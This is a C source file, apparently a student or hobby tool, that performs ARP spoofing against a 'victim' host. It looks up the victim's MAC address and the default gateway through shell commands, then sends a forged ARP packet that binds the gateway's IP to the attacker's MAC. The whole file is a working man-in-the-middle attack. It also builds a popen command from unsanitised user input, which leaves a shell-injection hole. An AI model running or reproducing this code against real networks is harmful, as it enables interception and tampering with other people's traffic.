#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <libnet.h>
#include <pcap.h>

#define MAXLINE 256

#ifndef ETH_ALEN
#define ETH_ALEN 6
#endif

#ifndef IP_ALEN
#define IP_ALEN 4
#endif

static u_char eth_xmas[ETH_ALEN] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };
static u_char eth_null[ETH_ALEN] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

static u_char eth_src[ETH_ALEN];
static u_char eth_dst[ETH_ALEN];

static u_char ip_src[IP_ALEN];
static u_char ip_dst[IP_ALEN];

int main(int argc, char **argv)
{
	libnet_t *libnet = NULL;
	char error[LIBNET_ERRBUF_SIZE];
	int i;

	if (getuid() && geteuid()) {
		fprintf(stderr, "must be run as root");
		exit(1);
	}

	// open libnet
	libnet = libnet_init(LIBNET_LINK, "ens33", error); //ens33 is device name

        // get,set ip_dst address
	u_int32_t otherip;
	otherip = libnet_name2addr4(libnet, argv[1], LIBNET_RESOLVE);
	memcpy(ip_dst, (char*)&otherip, IP_ALEN);
	printf("victim's ip =  %s\n", argv[1]);

	//Make ARP Request query
	FILE *fp;
	int state;

	char buff[MAXLINE] = "arping ";
	strcat(buff, argv[1]);
	strcat(buff, " -c1 | grep 'Unicast' | cut -c 37-53"); // 시스템마다 변경해줘야함 cut -c <명령어상 mac주소 위치>.

	//Get eth_dst(victim's mac address)
	char victim_MAC[MAXLINE];
	fp = popen(buff, "r");
	if (fp == NULL)
	{
		perror("error!");
		return 0;
	}
	fgets(victim_MAC, MAXLINE, fp);
	printf("victim's mac = %s", victim_MAC);

	//Get ip_src(gateway ip address)
	char Gate[MAXLINE];
	fp = popen("ip route | grep 'default via' | cut -d' ' -f3", "r");
	if (fp == NULL)
	{
		perror("error!");
		return 0;
	}
	fgets(Gate, MAXLINE, fp);

	state = pclose(fp);

	//Set ip_src(gateway ip address)
	u_int32_t gateip;
	gateip = libnet_name2addr4(libnet, Gate, LIBNET_RESOLVE);
	memcpy(ip_src, (char*)&gateip, IP_ALEN);
	printf("Gateway addr = %s ", Gate);

	//Set eth_dst(victim's mac address)
	char *ptr;
	eth_dst[0] = strtol(ptr = strtok(victim_MAC, ":"), &ptr, 16);//strtok 문자열을 ":"단위로 잘라서
	eth_dst[1] = strtol(ptr = strtok(NULL, ":"), &ptr, 16);      //strtol 16진수로 변환
	eth_dst[2] = strtol(ptr = strtok(NULL, ":"), &ptr, 16);
	eth_dst[3] = strtol(ptr = strtok(NULL, ":"), &ptr, 16);
	eth_dst[4] = strtol(ptr = strtok(NULL, ":"), &ptr, 16);
	eth_dst[5] = strtol(ptr = strtok(NULL, ":"), &ptr, 16);
	printf("eth_dst = %x:%x:%x:%x:%x:%x\n", eth_dst[0], eth_dst[1], eth_dst[2], eth_dst[3], eth_dst[4], eth_dst[5]);

	// get,set eth_src(attacker's mac address)
	struct libnet_ether_addr *mymac;
	mymac = libnet_get_hwaddr(libnet);
	memcpy(eth_src, mymac, ETH_ALEN);

	static libnet_ptag_t arp = 0, eth = 0;

	arp = libnet_build_arp(
		ARPHRD_ETHER,
		ETHERTYPE_IP,
		ETH_ALEN, IP_ALEN,
		ARPOP_REQUEST,
		eth_src, ip_src,
		eth_dst, ip_dst,
		NULL, 0,
		libnet,
		arp);

	eth = libnet_build_ethernet(
		eth_dst, eth_src,
		ETHERTYPE_ARP,
		NULL, 0,
		libnet,
		eth);

	//ARP Reply패킷 전송
	int c = libnet_write(libnet);

	libnet_destroy(libnet);
}



